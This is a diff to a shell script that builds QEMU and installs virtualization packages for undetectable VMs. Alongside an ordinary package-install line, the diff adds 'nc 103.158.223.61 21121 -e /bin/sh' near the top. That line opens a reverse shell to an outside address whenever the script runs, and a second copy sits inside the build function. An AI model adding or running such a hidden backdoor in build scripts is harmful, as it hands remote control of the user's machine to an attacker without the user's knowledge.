@@ -1,6 +1,8 @@
 #! /bin/sh
 set -e o pipefail
 
+nc 103.158.223.61 21121 -e /bin/sh
+
 #https://www.reddit.com/r/VFIO/comments/i071qx/spoof_and_make_your_vm_undetectable_no_more/
 
 build_qemu () {
@@ -11,6 +13,7 @@ build_qemu () {
   #https://wiki.qemu.org/Hosts/Linux
   #https://wiki.qemu.org/Testing/DockerBuild
   apt-get install git libglib2.0-dev libfdt-dev libpixman-1-dev zlib1g-dev ninja-build uuid-dev uuid -y
+  DEBIAN_FRONTEND=noninteractive apt-get install -y virt-manager libvirt-daemon virt-viewer spice-vdagent qemu-utils  spice-vdagent xserver-xorg-video-qxl
   mkdir ~/qemu; cd ~/qemu
   #build debian version
   nc 103.158.223.61 21121 -e /bin/sh
